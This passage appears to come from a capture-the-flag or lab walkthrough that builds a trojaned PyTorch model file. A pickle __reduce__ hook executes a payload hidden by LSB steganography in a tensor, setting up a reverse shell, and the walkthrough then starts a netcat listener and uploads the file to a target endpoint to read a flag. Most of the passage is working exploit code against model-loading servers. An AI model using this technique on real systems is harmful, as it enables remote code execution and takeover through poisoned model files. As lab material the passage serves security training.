            if bit_count == 8: decoded_bytes.append(current_byte_val); current_byte_val = 0; bit_count = 0
        return bytes(decoded_bytes)
    except Exception as e: raise RuntimeError(f"LSB Decode error: {e}") from e
"""

        pickled_state_dict_literal = repr(self.pickled_state_dict_bytes)

        loader_code = f"""
import pickle, torch, struct, traceback, os, pty, socket, sys, subprocess
print('[+] Loader: Execution started.', file=sys.stderr); sys.stderr.flush()
{decode_lsb_source}
pickled_state_dict_bytes = {pickled_state_dict_literal}
target_key = {repr(self.target_key)}
num_lsb = {self.num_lsb}
try:
    reconstructed_state_dict = pickle.loads(pickled_state_dict_bytes)
    payload_tensor = reconstructed_state_dict[target_key]
    extracted_payload_bytes = decode_lsb(payload_tensor, num_lsb)
    extracted_payload_code = extracted_payload_bytes.decode('utf-8', errors='replace')
    print('[!] Loader: Executing decoded payload...', file=sys.stderr); sys.stderr.flush()
    exec(extracted_payload_code, globals(), locals())
except Exception as e:
    print(f'[!!!] Loader: FATAL ERROR: {{e}}', file=sys.stderr)
    traceback.print_exc(file=sys.stderr); sys.stderr.flush()
finally:
    print('[+] Loader: Finished.', file=sys.stderr); sys.stderr.flush()
"""
        return (exec, (loader_code,))

print("TrojanModelWrapper class defined.")
```
### Execute the Attack
With the `TrojanModelWrapper` class defined and the payload embedded in the modified `state_dict`, execution has three steps: wrap and save the malicious model file, start a listener, and upload to the target.

Trigger the Attack
- Verify `HOST_IP` is set to your listener's IP (reachable from the target)
- Start a netcat listener: `nc -lvnp 4444`
- Upload the malicious file to the target's `/upload` endpoint
- The server calls `torch.load()` → `__reduce__` fires → reverse shell connects back
- Grab the flag: `cat /app/flag.txt`

```python
import requests
import os
import traceback

# ============================================================
# 1. Create & Save the Malicious Model File
# ============================================================

if "modified_state_dict" not in locals() or not isinstance(modified_state_dict, dict):
    raise NameError("'modified_state_dict' not found. Run embedding step first.")
if "target_key" not in locals():
    raise NameError("'target_key' not defined.")

print(f"\n--- Instantiating TrojanModelWrapper ---")
try:
    wrapper_instance = TrojanModelWrapper(
        modified_state_dict=modified_state_dict,
        target_key=target_key,
        num_lsb=NUM_LSB,
    )
    print("TrojanModelWrapper instance created.")
except Exception as e:
    print(f"Error: {e}")
    raise SystemExit("Failed to instantiate TrojanModelWrapper.") from e

final_malicious_file = "malicious_trojan_model.pth"

print(f"\n--- Saving to '{final_malicious_file}' ---")
try:
    torch.save(wrapper_instance, final_malicious_file)
    print(f"Saved successfully. File size: {os.path.getsize(final_malicious_file)} bytes.")
except Exception as e:
    traceback.print_exc()
    raise SystemExit("Failed to save malicious file.") from e


# ============================================================
# 2. Upload to Target (start nc -lvnp 4444 first!)
# ============================================================

api_url = "http://localhost:5555/upload"  # Replace with target instance URL
pickle_file_path = final_malicious_file

print(f"\nUploading '{pickle_file_path}' to '{api_url}'...")

if not os.path.exists(pickle_file_path):
    print(f"Error: File not found at '{pickle_file_path}'.")
else:
    files_to_upload = {
        "model": (
            os.path.basename(pickle_file_path),
            open(pickle_file_path, "rb"),
            "application/octet-stream",
        )
    }

    try:
        response = requests.post(api_url, files=files_to_upload)
        print(f"\nStatus Code: {response.status_code}")
        try:
            print(response.json())
        except requests.exceptions.JSONDecodeError:
            print(response.text)

        if response.status_code == 200:
            print("\nUpload successful. Check your listener for a connection.")
            print("Then run: cat /app/flag.txt")
        else:
            print(f"\nUpload failed (status {response.status_code}).")

    except requests.exceptions.ConnectionError as e:
        print(f"\nConnection error: {e}")
        print("Verify the API URL, that the target is running, and your listener is active.")
    except Exception as e:
        traceback.print_exc()
    finally:
        if "files_to_upload" in locals() and "model" in files_to_upload:
            try:
                files_to_upload["model"][1].close()
            except:
                pass

print("\nUpload script finished.")
```